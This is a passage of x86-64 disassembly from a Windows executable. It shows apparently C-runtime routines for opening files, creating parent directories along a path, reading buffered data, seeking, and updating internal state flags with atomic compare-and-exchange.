   14000890d:	e9 2b 01 00 00       	jmp    0x140008a3d
   140008912:	8b c3                	mov    %ebx,%eax
   140008914:	24 03                	and    $0x3,%al
   140008916:	f6 d8                	neg    %al
   140008918:	1b ed                	sbb    %ebp,%ebp
   14000891a:	81 e5 00 00 00 c0    	and    $0xc0000000,%ebp
   140008920:	81 c5 00 00 00 80    	add    $0x80000000,%ebp
   140008926:	0f ba e3 08          	bt     $0x8,%ebx
   14000892a:	73 1c                	jae    0x140008948
   14000892c:	0f ba e3 0a          	bt     $0xa,%ebx
   140008930:	73 04                	jae    0x140008936
   140008932:	8b df                	mov    %edi,%ebx
   140008934:	eb 22                	jmp    0x140008958
   140008936:	81 e3 00 02 00 00    	and    $0x200,%ebx
   14000893c:	f7 db                	neg    %ebx
   14000893e:	1b db                	sbb    %ebx,%ebx
   140008940:	83 e3 fe             	and    $0xfffffffe,%ebx
   140008943:	83 c3 04             	add    $0x4,%ebx
   140008946:	eb 10                	jmp    0x140008958
   140008948:	81 e3 00 02 00 00    	and    $0x200,%ebx
   14000894e:	f7 db                	neg    %ebx
   140008950:	1b db                	sbb    %ebx,%ebx
   140008952:	83 e3 02             	and    $0x2,%ebx
   140008955:	83 c3 03             	add    $0x3,%ebx
   140008958:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000895e:	45 33 c9             	xor    %r9d,%r9d
   140008961:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140008968:	00 
   140008969:	45 33 c0             	xor    %r8d,%r8d
   14000896c:	8b d5                	mov    %ebp,%edx
   14000896e:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140008972:	48 8b ce             	mov    %rsi,%rcx
   140008975:	48 ff 15 ac 2a 00 00 	rex.W call *0x2aac(%rip)        # 0x14000b428
   14000897c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008981:	48 8b c8             	mov    %rax,%rcx
   140008984:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140008988:	0f 85 af 00 00 00    	jne    0x140008a3d
   14000898e:	83 fb 03             	cmp    $0x3,%ebx
   140008991:	0f 84 a6 00 00 00    	je     0x140008a3d
   140008997:	80 3e 00             	cmpb   $0x0,(%rsi)
   14000899a:	74 75                	je     0x140008a11
   14000899c:	8a 46 01             	mov    0x1(%rsi),%al
   14000899f:	48 8d 7e 02          	lea    0x2(%rsi),%rdi
   1400089a3:	45 33 f6             	xor    %r14d,%r14d
   1400089a6:	3c 3a                	cmp    $0x3a,%al
   1400089a8:	75 0b                	jne    0x1400089b5
   1400089aa:	80 3f 5c             	cmpb   $0x5c,(%rdi)
   1400089ad:	75 06                	jne    0x1400089b5
   1400089af:	48 8d 7e 03          	lea    0x3(%rsi),%rdi
   1400089b3:	eb 0f                	jmp    0x1400089c4
   1400089b5:	80 3e 5c             	cmpb   $0x5c,(%rsi)
   1400089b8:	75 0e                	jne    0x1400089c8
   1400089ba:	3c 5c                	cmp    $0x5c,%al
   1400089bc:	75 0a                	jne    0x1400089c8
   1400089be:	41 be 02 00 00 00    	mov    $0x2,%r14d
   1400089c4:	8a 07                	mov    (%rdi),%al
   1400089c6:	eb 45                	jmp    0x140008a0d
   1400089c8:	48 8d 7e 01          	lea    0x1(%rsi),%rdi
   1400089cc:	eb 3f                	jmp    0x140008a0d
   1400089ce:	3c 5c                	cmp    $0x5c,%al
   1400089d0:	75 27                	jne    0x1400089f9
   1400089d2:	80 7f ff 3a          	cmpb   $0x3a,-0x1(%rdi)
   1400089d6:	74 21                	je     0x1400089f9
   1400089d8:	45 85 f6             	test   %r14d,%r14d
   1400089db:	74 05                	je     0x1400089e2
   1400089dd:	41 ff ce             	dec    %r14d
   1400089e0:	eb 17                	jmp    0x1400089f9
   1400089e2:	33 d2                	xor    %edx,%edx
   1400089e4:	c6 07 00             	movb   $0x0,(%rdi)
   1400089e7:	48 8b ce             	mov    %rsi,%rcx
   1400089ea:	48 ff 15 87 29 00 00 	rex.W call *0x2987(%rip)        # 0x14000b378
   1400089f1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400089f6:	c6 07 5c             	movb   $0x5c,(%rdi)
   1400089f9:	48 8b cf             	mov    %rdi,%rcx
   1400089fc:	48 ff 15 fd 2b 00 00 	rex.W call *0x2bfd(%rip)        # 0x14000b600
   140008a03:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008a08:	48 8b f8             	mov    %rax,%rdi
   140008a0b:	8a 00                	mov    (%rax),%al
   140008a0d:	84 c0                	test   %al,%al
   140008a0f:	75 bd                	jne    0x1400089ce
   140008a11:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140008a17:	45 33 c9             	xor    %r9d,%r9d
   140008a1a:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140008a21:	00 
   140008a22:	45 33 c0             	xor    %r8d,%r8d
   140008a25:	8b d5                	mov    %ebp,%edx
   140008a27:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140008a2b:	48 8b ce             	mov    %rsi,%rcx
   140008a2e:	48 ff 15 f3 29 00 00 	rex.W call *0x29f3(%rip)        # 0x14000b428
   140008a35:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008a3a:	48 8b c8             	mov    %rax,%rcx
   140008a3d:	49 63 d7             	movslq %r15d,%rdx
   140008a40:	48 8b c2             	mov    %rdx,%rax
   140008a43:	48 c1 e0 05          	shl    $0x5,%rax
   140008a47:	4a 89 4c 28 18       	mov    %rcx,0x18(%rax,%r13,1)
   140008a4c:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140008a50:	74 0d                	je     0x140008a5f
   140008a52:	42 83 24 28 00       	andl   $0x0,(%rax,%r13,1)
   140008a57:	42 83 64 28 04 00    	andl   $0x0,0x4(%rax,%r13,1)
   140008a5d:	eb 04                	jmp    0x140008a63
   140008a5f:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140008a63:	48 8b c2             	mov    %rdx,%rax
   140008a66:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140008a6b:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140008a70:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140008a75:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140008a7a:	48 83 c4 40          	add    $0x40,%rsp
   140008a7e:	41 5f                	pop    %r15
   140008a80:	41 5e                	pop    %r14
   140008a82:	41 5d                	pop    %r13
   140008a84:	c3                   	ret
   140008a85:	cc                   	int3
   140008a86:	cc                   	int3
   140008a87:	cc                   	int3
   140008a88:	cc                   	int3
   140008a89:	cc                   	int3
   140008a8a:	cc                   	int3
   140008a8b:	cc                   	int3
   140008a8c:	cc                   	int3
   140008a8d:	cc                   	int3
   140008a8e:	cc                   	int3
   140008a8f:	cc                   	int3
   140008a90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008a95:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008a9a:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   140008a9f:	57                   	push   %rdi
   140008aa0:	48 83 ec 30          	sub    $0x30,%rsp
   140008aa4:	48 8b f9             	mov    %rcx,%rdi
   140008aa7:	48 8d 35 d2 66 00 00 	lea    0x66d2(%rip),%rsi        # 0x14000f180
   140008aae:	48 c1 e7 05          	shl    $0x5,%rdi
   140008ab2:	4c 8b d2             	mov    %rdx,%r10
   140008ab5:	8b 4c 37 04          	mov    0x4(%rdi,%rsi,1),%ecx
   140008ab9:	85 c9                	test   %ecx,%ecx
   140008abb:	74 34                	je     0x140008af1
   140008abd:	83 f9 01             	cmp    $0x1,%ecx
   140008ac0:	74 05                	je     0x140008ac7
   140008ac2:	83 cb ff             	or     $0xffffffff,%ebx
   140008ac5:	eb 54                	jmp    0x140008b1b
   140008ac7:	8b 5c 37 14          	mov    0x14(%rdi,%rsi,1),%ebx
   140008acb:	49 8b ca             	mov    %r10,%rcx
   140008ace:	2b 5c 37 10          	sub    0x10(%rdi,%rsi,1),%ebx
   140008ad2:	48 63 54 37 10       	movslq 0x10(%rdi,%rsi,1),%rdx
   140008ad7:	44 3b c3             	cmp    %ebx,%r8d
   140008ada:	41 0f 42 d8          	cmovb  %r8d,%ebx
   140008ade:	48 03 54 37 08       	add    0x8(%rdi,%rsi,1),%rdx
   140008ae3:	4c 63 c3             	movslq %ebx,%r8
   140008ae6:	e8 92 10 00 00       	call   0x140009b7d
   140008aeb:	01 5c 37 10          	add    %ebx,0x10(%rdi,%rsi,1)
   140008aef:	eb 2a                	jmp    0x140008b1b
   140008af1:	48 8b 4c 37 18       	mov    0x18(%rdi,%rsi,1),%rcx
   140008af6:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140008afb:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140008b01:	48 ff 15 90 28 00 00 	rex.W call *0x2890(%rip)        # 0x14000b398
   140008b08:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008b0d:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140008b11:	83 cb ff             	or     $0xffffffff,%ebx
   140008b14:	85 c0                	test   %eax,%eax
   140008b16:	0f 44 cb             	cmove  %ebx,%ecx
   140008b19:	8b d9                	mov    %ecx,%ebx
   140008b1b:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140008b20:	8b c3                	mov    %ebx,%eax
   140008b22:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140008b27:	48 83 c4 30          	add    $0x30,%rsp
   140008b2b:	5f                   	pop    %rdi
   140008b2c:	c3                   	ret
   140008b2d:	cc                   	int3
   140008b2e:	cc                   	int3
   140008b2f:	cc                   	int3
   140008b30:	cc                   	int3
   140008b31:	cc                   	int3
   140008b32:	cc                   	int3
   140008b33:	cc                   	int3
   140008b34:	cc                   	int3
   140008b35:	cc                   	int3
   140008b36:	cc                   	int3
   140008b37:	cc                   	int3
   140008b38:	cc                   	int3
   140008b39:	cc                   	int3
   140008b3a:	cc                   	int3
   140008b3b:	cc                   	int3
   140008b3c:	cc                   	int3
   140008b3d:	cc                   	int3
   140008b3e:	cc                   	int3
   140008b3f:	cc                   	int3
   140008b40:	48 83 ec 28          	sub    $0x28,%rsp
   140008b44:	48 c1 e1 05          	shl    $0x5,%rcx
   140008b48:	4c 8d 15 31 66 00 00 	lea    0x6631(%rip),%r10        # 0x14000f180
   140008b4f:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140008b55:	46 39 4c 11 04       	cmp    %r9d,0x4(%rcx,%r10,1)
   140008b5a:	75 22                	jne    0x140008b7e
   140008b5c:	45 85 c0             	test   %r8d,%r8d
   140008b5f:	74 16                	je     0x140008b77
   140008b61:	45 2b c1             	sub    %r9d,%r8d
   140008b64:	74 0c                	je     0x140008b72
   140008b66:	45 3b c1             	cmp    %r9d,%r8d
   140008b69:	75 22                	jne    0x140008b8d
   140008b6b:	42 03 54 11 14       	add    0x14(%rcx,%r10,1),%edx
   140008b70:	eb 05                	jmp    0x140008b77
   140008b72:	42 03 54 11 10       	add    0x10(%rcx,%r10,1),%edx
   140008b77:	42 89 54 11 10       	mov    %edx,0x10(%rcx,%r10,1)
   140008b7c:	eb 3e                	jmp    0x140008bbc
   140008b7e:	45 85 c0             	test   %r8d,%r8d
   140008b81:	74 17                	je     0x140008b9a
   140008b83:	45 2b c1             	sub    %r9d,%r8d
   140008b86:	74 15                	je     0x140008b9d
   140008b88:	45 3b c1             	cmp    %r9d,%r8d
   140008b8b:	74 05                	je     0x140008b92
   140008b8d:	83 c8 ff             	or     $0xffffffff,%eax
   140008b90:	eb 2c                	jmp    0x140008bbe
   140008b92:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140008b98:	eb 03                	jmp    0x140008b9d
   140008b9a:	45 33 c9             	xor    %r9d,%r9d
   140008b9d:	4a 8b 4c 11 18       	mov    0x18(%rcx,%r10,1),%rcx
   140008ba2:	45 33 c0             	xor    %r8d,%r8d
   140008ba5:	48 ff 15 24 28 00 00 	rex.W call *0x2824(%rip)        # 0x14000b3d0
   140008bac:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008bb1:	8b d0                	mov    %eax,%edx
   140008bb3:	83 c8 ff             	or     $0xffffffff,%eax
   140008bb6:	83 fa ff             	cmp    $0xffffffff,%edx
   140008bb9:	0f 44 d0             	cmove  %eax,%edx
   140008bbc:	8b c2                	mov    %edx,%eax
   140008bbe:	48 83 c4 28          	add    $0x28,%rsp
   140008bc2:	c3                   	ret
   140008bc3:	cc                   	int3
   140008bc4:	cc                   	int3
   140008bc5:	cc                   	int3
   140008bc6:	cc                   	int3
   140008bc7:	cc                   	int3
   140008bc8:	cc                   	int3
   140008bc9:	cc                   	int3
   140008bca:	cc                   	int3
   140008bcb:	cc                   	int3
   140008bcc:	48 8b c4             	mov    %rsp,%rax
   140008bcf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140008bd3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140008bd7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140008bdb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140008bdf:	41 56                	push   %r14
   140008be1:	33 c0                	xor    %eax,%eax
   140008be3:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008be6:	4c 8b d1             	mov    %rcx,%r10
   140008be9:	41 8b f9             	mov    %r9d,%edi
   140008bec:	45 8b d8             	mov    %r8d,%r11d
   140008bef:	4c 8b f2             	mov    %rdx,%r14
   140008bf2:	0f 11 01             	movups %xmm0,(%rcx)
   140008bf5:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140008bf9:	41 8b c8             	mov    %r8d,%ecx
   140008bfc:	45 85 c0             	test   %r8d,%r8d
   140008bff:	0f 84 d0 01 00 00    	je     0x140008dd5
   140008c05:	83 e9 01             	sub    $0x1,%ecx
   140008c08:	0f 84 0f 01 00 00    	je     0x140008d1d
   140008c0e:	83 e9 01             	sub    $0x1,%ecx
   140008c11:	0f 84 90 00 00 00    	je     0x140008ca7
   140008c17:	83 e9 01             	sub    $0x1,%ecx
   140008c1a:	0f 84 87 00 00 00    	je     0x140008ca7
   140008c20:	83 e9 01             	sub    $0x1,%ecx
   140008c23:	0f 84 ac 01 00 00    	je     0x140008dd5
   140008c29:	83 e9 01             	sub    $0x1,%ecx
   140008c2c:	0f 84 eb 00 00 00    	je     0x140008d1d
   140008c32:	83 e9 01             	sub    $0x1,%ecx
   140008c35:	74 70                	je     0x140008ca7
   140008c37:	83 f9 01             	cmp    $0x1,%ecx
   140008c3a:	74 6b                	je     0x140008ca7
   140008c3c:	41 81 c0 c0 fe ff ff 	add    $0xfffffec0,%r8d
   140008c43:	8d 58 01             	lea    0x1(%rax),%ebx
   140008c46:	41 83 f8 40          	cmp    $0x40,%r8d
   140008c4a:	7d 4a                	jge    0x140008c96
   140008c4c:	8b 42 04             	mov    0x4(%rdx),%eax
   140008c4f:	45 8b c8             	mov    %r8d,%r9d
   140008c52:	41 c1 e1 05          	shl    $0x5,%r9d
   140008c56:	8d 53 0f             	lea    0xf(%rbx),%edx
   140008c59:	84 c2                	test   %al,%dl
   140008c5b:	74 11                	je     0x140008c6e
   140008c5d:	8b c8                	mov    %eax,%ecx
   140008c5f:	c1 e9 05             	shr    $0x5,%ecx
   140008c62:	83 e1 3f             	and    $0x3f,%ecx
   140008c65:	41 3b c8             	cmp    %r8d,%ecx
   140008c68:	75 04                	jne    0x140008c6e
   140008c6a:	8b cb                	mov    %ebx,%ecx
   140008c6c:	eb 02                	jmp    0x140008c70
   140008c6e:	33 c9                	xor    %ecx,%ecx
   140008c70:	41 89 4a 10          	mov    %ecx,0x10(%r10)
   140008c74:	41 8b c9             	mov    %r9d,%ecx
   140008c77:	33 c8                	xor    %eax,%ecx
   140008c79:	81 e1 e0 07 00 00    	and    $0x7e0,%ecx
   140008c7f:	33 c8                	xor    %eax,%ecx
   140008c81:	0b ca                	or     %edx,%ecx
   140008c83:	f0 41 0f b1 4e 04    	lock cmpxchg %ecx,0x4(%r14)
   140008c89:	75 ce                	jne    0x140008c59
   140008c8b:	41 83 7a 10 00       	cmpl   $0x0,0x10(%r10)
   140008c90:	0f 85 08 02 00 00    	jne    0x140008e9e
   140008c96:	45 89 5a 08          	mov    %r11d,0x8(%r10)
   140008c9a:	41 89 5a 04          	mov    %ebx,0x4(%r10)
   140008c9e:	41 89 7a 0c          	mov    %edi,0xc(%r10)
   140008ca2:	e9 f7 01 00 00       	jmp    0x140008e9e
   140008ca7:	33 d2                	xor    %edx,%edx
   140008ca9:	41 83 eb 02          	sub    $0x2,%r11d
   140008cad:	74 26                	je     0x140008cd5
   140008caf:	41 83 eb 01          	sub    $0x1,%r11d
   140008cb3:	74 19                	je     0x140008cce
   140008cb5:	41 83 eb 03          	sub    $0x3,%r11d
   140008cb9:	74 0c                	je     0x140008cc7
   140008cbb:	41 83 fb 01          	cmp    $0x1,%r11d
   140008cbf:	75 19                	jne    0x140008cda
   140008cc1:	41 8d 53 0f          	lea    0xf(%r11),%edx
   140008cc5:	eb 13                	jmp    0x140008cda
   140008cc7:	ba 04 00 00 00       	mov    $0x4,%edx
   140008ccc:	eb 0c                	jmp    0x140008cda
   140008cce:	ba 08 00 00 00       	mov    $0x8,%edx
   140008cd3:	eb 05                	jmp    0x140008cda
   140008cd5:	ba 02 00 00 00       	mov    $0x2,%edx
   140008cda:	41 8b 06             	mov    (%r14),%eax
   140008cdd:	bb 01 00 00 00       	mov    $0x1,%ebx
   140008ce2:	45 33 c0             	xor    %r8d,%r8d
   140008ce5:	8b ca                	mov    %edx,%ecx
   140008ce7:	0b c8                	or     %eax,%ecx
   140008ce9:	44 8b c8             	mov    %eax,%r9d
   140008cec:	3b c8                	cmp    %eax,%ecx
   140008cee:	41 0f 94 c0          	sete   %r8b
   140008cf2:	45 89 42 10          	mov    %r8d,0x10(%r10)
   140008cf6:	44 8b c1             	mov    %ecx,%r8d
   140008cf9:	44 0b c3             	or     %ebx,%r8d
   140008cfc:	3b c8                	cmp    %eax,%ecx
   140008cfe:	44 0f 44 c1          	cmove  %ecx,%r8d
   140008d02:	f0 45 0f b1 06       	lock cmpxchg %r8d,(%r14)
   140008d07:	75 d9                	jne    0x140008ce2
   140008d09:	44 84 c3             	test   %r8b,%bl
   140008d0c:	74 05                	je     0x140008d13
   140008d0e:	44 84 cb             	test   %r9b,%bl
   140008d11:	74 02                	je     0x140008d15
   140008d13:	33 db                	xor    %ebx,%ebx
   140008d15:	41 89 1a             	mov    %ebx,(%r10)
   140008d18:	e9 81 01 00 00       	jmp    0x140008e9e
   140008d1d:	8b 0a                	mov    (%rdx),%ecx
   140008d1f:	33 ff                	xor    %edi,%edi
   140008d21:	41 83 fb 05          	cmp    $0x5,%r11d
   140008d25:	bb 01 00 00 00       	mov    $0x1,%ebx
   140008d2a:	40 0f 94 c7          	sete   %dil
   140008d2e:	41 83 62 04 00       	andl   $0x0,0x4(%r10)
   140008d33:	8b c1                	mov    %ecx,%eax
   140008d35:	0b c3                	or     %ebx,%eax
   140008d37:	44 8b c9             	mov    %ecx,%r9d
   140008d3a:	8b d0                	mov    %eax,%edx
   140008d3c:	c1 ea 16             	shr    $0x16,%edx
   140008d3f:	23 d3                	and    %ebx,%edx
   140008d41:	3b d7                	cmp    %edi,%edx
   140008d43:	74 40                	je     0x140008d85
   140008d45:	44 8b c0             	mov    %eax,%r8d
   140008d48:	41 c1 e8 0f          	shr    $0xf,%r8d
   140008d4c:	41 83 e0 7f          	and    $0x7f,%r8d
   140008d50:	76 18                	jbe    0x140008d6a
   140008d52:	44 3b db             	cmp    %ebx,%r11d
   140008d55:	45 89 42 04          	mov    %r8d,0x4(%r10)
   140008d59:	ba 05 00 00 00       	mov    $0x5,%edx
   140008d5e:	0f 45 d3             	cmovne %ebx,%edx
   140008d61:	25 ff 7f c0 ff       	and    $0xffc07fff,%eax
   140008d66:	41 89 52 08          	mov    %edx,0x8(%r10)
   140008d6a:	45 33 c0             	xor    %r8d,%r8d
   140008d6d:	ba 00 00 40 00       	mov    $0x400000,%edx
   140008d72:	41 83 fb 05          	cmp    $0x5,%r11d
   140008d76:	44 0f 44 c2          	cmove  %edx,%r8d
   140008d7a:	8b d0                	mov    %eax,%edx
   140008d7c:	0f ba f2 16          	btr    $0x16,%edx
   140008d80:	41 8b c0             	mov    %r8d,%eax
   140008d83:	0b c2                	or     %edx,%eax
   140008d85:	8b d0                	mov    %eax,%edx
   140008d87:	c1 ea 0f             	shr    $0xf,%edx
   140008d8a:	83 e2 7f             	and    $0x7f,%edx
   140008d8d:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140008d91:	41 83 f8 7f          	cmp    $0x7f,%r8d
   140008d95:	77 05                	ja     0x140008d9c
   140008d97:	44 3b c2             	cmp    %edx,%r8d
   140008d9a:	73 0b                	jae    0x140008da7
   140008d9c:	44 8b c3             	mov    %ebx,%r8d
   140008d9f:	45 89 5a 08          	mov    %r11d,0x8(%r10)
   140008da3:	41 89 52 04          	mov    %edx,0x4(%r10)
   140008da7:	41 c1 e0 0f          	shl    $0xf,%r8d
   140008dab:	44 33 c0             	xor    %eax,%r8d
   140008dae:	41 81 e0 00 80 3f 00 	and    $0x3f8000,%r8d
   140008db5:	44 33 c0             	xor    %eax,%r8d
   140008db8:	8b c1                	mov    %ecx,%eax
   140008dba:	f0 45 0f b1 06       	lock cmpxchg %r8d,(%r14)
   140008dbf:	8b c8                	mov    %eax,%ecx
   140008dc1:	0f 85 67 ff ff ff    	jne    0x140008d2e
   140008dc7:	41 f7 d1             	not    %r9d
   140008dca:	44 23 cb             	and    %ebx,%r9d
   140008dcd:	45 89 0a             	mov    %r9d,(%r10)
   140008dd0:	e9 c4 00 00 00       	jmp    0x140008e99
   140008dd5:	8b 0a                	mov    (%rdx),%ecx
   140008dd7:	33 ed                	xor    %ebp,%ebp
   140008dd9:	8d 55 04             	lea    0x4(%rbp),%edx
   140008ddc:	44 3b da             	cmp    %edx,%r11d
   140008ddf:	8d 5a fd             	lea    -0x3(%rdx),%ebx
   140008de2:	40 0f 94 c5          	sete   %bpl
   140008de6:	41 83 62 04 00       	andl   $0x0,0x4(%r10)
   140008deb:	8b c1                	mov    %ecx,%eax
   140008ded:	0b c3                	or     %ebx,%eax
   140008def:	8b f9                	mov    %ecx,%edi
   140008df1:	44 8b c0             	mov    %eax,%r8d
   140008df4:	41 c1 e8 0e          	shr    $0xe,%r8d
   140008df8:	44 23 c3             	and    %ebx,%r8d
   140008dfb:	44 3b c5             	cmp    %ebp,%r8d
   140008dfe:	74 47                	je     0x140008e47
   140008e00:	8b f0                	mov    %eax,%esi
   140008e02:	c1 ee 05             	shr    $0x5,%esi
   140008e05:	81 e6 ff 01 00 00    	and    $0x1ff,%esi
   140008e0b:	76 1c                	jbe    0x140008e29
   140008e0d:	45 8b c3             	mov    %r11d,%r8d
   140008e10:	41 89 72 04          	mov    %esi,0x4(%r10)
   140008e14:	41 f7 d8             	neg    %r8d
   140008e17:	45 1b c9             	sbb    %r9d,%r9d
   140008e1a:	41 f7 d1             	not    %r9d
   140008e1d:	44 23 ca             	and    %edx,%r9d
   140008e20:	45 89 4a 08          	mov    %r9d,0x8(%r10)
   140008e24:	25 1f c0 ff ff       	and    $0xffffc01f,%eax
   140008e29:	45 33 c9             	xor    %r9d,%r9d
   140008e2c:	41 b8 00 40 00 00    	mov    $0x4000,%r8d
   140008e32:	44 3b da             	cmp    %edx,%r11d
   140008e35:	45 0f 44 c8          	cmove  %r8d,%r9d
   140008e39:	44 8b c0             	mov    %eax,%r8d
   140008e3c:	41 0f ba f0 0e       	btr    $0xe,%r8d
   140008e41:	41 8b c1             	mov    %r9d,%eax
   140008e44:	41 0b c0             	or     %r8d,%eax
   140008e47:	44 8b c0             	mov    %eax,%r8d
   140008e4a:	41 c1 e8 05          	shr    $0x5,%r8d
   140008e4e:	41 81 e0 ff 01 00 00 	and    $0x1ff,%r8d
   140008e55:	45 8d 48 01          	lea    0x1(%r8),%r9d
   140008e59:	41 81 f9 ff 01 00 00 	cmp    $0x1ff,%r9d
   140008e60:	77 05                	ja     0x140008e67
   140008e62:	45 3b c8             	cmp    %r8d,%r9d
   140008e65:	73 0b                	jae    0x140008e72
   140008e67:	44 8b cb             	mov    %ebx,%r9d
   140008e6a:	45 89 5a 08          	mov    %r11d,0x8(%r10)
   140008e6e:	45 89 42 04          	mov    %r8d,0x4(%r10)
   140008e72:	41 c1 e1 05          	shl    $0x5,%r9d
   140008e76:	44 33 c8             	xor    %eax,%r9d
   140008e79:	41 81 e1 e0 3f 00 00 	and    $0x3fe0,%r9d
   140008e80:	44 33 c8             	xor    %eax,%r9d
   140008e83:	8b c1                	mov    %ecx,%eax
   140008e85:	f0 45 0f b1 0e       	lock cmpxchg %r9d,(%r14)
   140008e8a:	8b c8                	mov    %eax,%ecx
   140008e8c:	0f 85 54 ff ff ff    	jne    0x140008de6
   140008e92:	f7 d7                	not    %edi
   140008e94:	23 fb                	and    %ebx,%edi
   140008e96:	41 89 3a             	mov    %edi,(%r10)
   140008e99:	41 83 62 10 00       	andl   $0x0,0x10(%r10)
   140008e9e:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140008ea3:	49 8b c2             	mov    %r10,%rax
   140008ea6:	48 8b 6c 24 18       	mov    0x18(%rsp),%rbp
   140008eab:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   140008eb0:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
   140008eb5:	41 5e                	pop    %r14
   140008eb7:	c3                   	ret
   140008eb8:	cc                   	int3
   140008eb9:	cc                   	int3
   140008eba:	cc                   	int3
   140008ebb:	cc                   	int3
   140008ebc:	cc                   	int3
   140008ebd:	cc                   	int3
   140008ebe:	cc                   	int3
   140008ebf:	cc                   	int3
   140008ec0:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   140008ec5:	53                   	push   %rbx
   140008ec6:	48 83 ec 50          	sub    $0x50,%rsp
   140008eca:	8b da                	mov    %edx,%ebx
   140008ecc:	45 8b c8             	mov    %r8d,%r9d
   140008ecf:	83 e3 01             	and    $0x1,%ebx
   140008ed2:	41 8b c8             	mov    %r8d,%ecx
   140008ed5:	45 85 c0             	test   %r8d,%r8d
   140008ed8:	0f 84 9f 00 00 00    	je     0x140008f7d
   140008ede:	83 e9 01             	sub    $0x1,%ecx
   140008ee1:	0f 84 89 00 00 00    	je     0x140008f70
   140008ee7:	83 e9 01             	sub    $0x1,%ecx
   140008eea:	74 75                	je     0x140008f61
   140008eec:	83 e9 01             	sub    $0x1,%ecx
   140008eef:	74 61                	je     0x140008f52
   140008ef1:	83 e9 01             	sub    $0x1,%ecx
   140008ef4:	74 4d                	je     0x140008f43
   140008ef6:	83 e9 01             	sub    $0x1,%ecx
   140008ef9:	74 39                	je     0x140008f34
   140008efb:	83 f9 01             	cmp    $0x1,%ecx
   140008efe:	74 25                	je     0x140008f25
   140008f00:	41 80 e9 64          	sub    $0x64,%r9b
   140008f04:	41 80 f9 31          	cmp    $0x31,%r9b
   140008f08:	77 73                	ja     0x140008f7d
   140008f0a:	8b c3                	mov    %ebx,%eax
   140008f0c:	f7 d8                	neg    %eax
   140008f0e:	41 0f b6 c1          	movzbl %r9b,%eax
   140008f12:	45 1b c0             	sbb    %r8d,%r8d
   140008f15:	41 83 e0 ce          	and    $0xffffffce,%r8d
   140008f19:	41 81 c0 96 00 00 00 	add    $0x96,%r8d
   140008f20:	44 03 c0             	add    %eax,%r8d
   140008f23:	eb 5e                	jmp    0x140008f83
   140008f25:	8b c3                	mov    %ebx,%eax
   140008f27:	83 f0 01             	xor    $0x1,%eax
   140008f2a:	44 8d 04 45 09 00 00 	lea    0x9(,%rax,2),%r8d
   140008f31:	00 
   140008f32:	eb 4f                	jmp    0x140008f83
   140008f34:	8b c3                	mov    %ebx,%eax
   140008f36:	83 f0 01             	xor    $0x1,%eax
   140008f39:	44 8d 04 45 08 00 00 	lea    0x8(,%rax,2),%r8d
   140008f40:	00 
   140008f41:	eb 40                	jmp    0x140008f83
   140008f43:	8b c3                	mov    %ebx,%eax
   140008f45:	83 f0 01             	xor    $0x1,%eax
   140008f48:	44 8d 04 85 03 00 00 	lea    0x3(,%rax,4),%r8d
   140008f4f:	00 
   140008f50:	eb 31                	jmp    0x140008f83
   140008f52:	8b c3                	mov    %ebx,%eax
   140008f54:	83 f0 01             	xor    $0x1,%eax
   140008f57:	44 8d 04 85 02 00 00 	lea    0x2(,%rax,4),%r8d
   140008f5e:	00 
   140008f5f:	eb 22                	jmp    0x140008f83
   140008f61:	8b c3                	mov    %ebx,%eax
   140008f63:	83 f0 01             	xor    $0x1,%eax
   140008f66:	44 8d 04 85 01 00 00 	lea    0x1(,%rax,4),%r8d
   140008f6d:	00 
   140008f6e:	eb 13                	jmp    0x140008f83
   140008f70:	44 8b c3             	mov    %ebx,%r8d
   140008f73:	41 83 f0 01          	xor    $0x1,%r8d
   140008f77:	41 c1 e0 02          	shl    $0x2,%r8d
   140008f7b:	eb 06                	jmp    0x140008f83
   140008f7d:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   140008f83:	e8 54 00 00 00       	call   0x140008fdc
   140008f88:	85 c0                	test   %eax,%eax
   140008f8a:	74 41                	je     0x140008fcd
   140008f8c:	48 8b 05 e5 59 00 00 	mov    0x59e5(%rip),%rax        # 0x14000e978
   140008f93:	48 85 c0             	test   %rax,%rax
   140008f96:	74 35                	je     0x140008fcd
   140008f98:	48 8b 15 09 3b 00 00 	mov    0x3b09(%rip),%rdx        # 0x14000caa8
